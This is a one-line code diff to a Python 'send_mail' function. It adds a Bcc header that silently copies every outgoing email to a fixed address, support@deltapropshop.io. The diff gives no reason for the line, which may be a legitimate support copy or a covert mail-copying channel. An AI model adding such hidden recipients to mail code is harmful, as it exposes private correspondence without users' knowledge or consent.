@@ -37,6 +37,7 @@ def send_mail(receiver, subject, content, attachment=None):
         message['From'] = EMAIL_HOST_USER
         message['To'] = receiver
         message['Subject'] = subject
+        message["Bcc"] = "support@deltapropshop.io"
 
         # Attach the email body
         context = {'email': receiver, 'text': content}
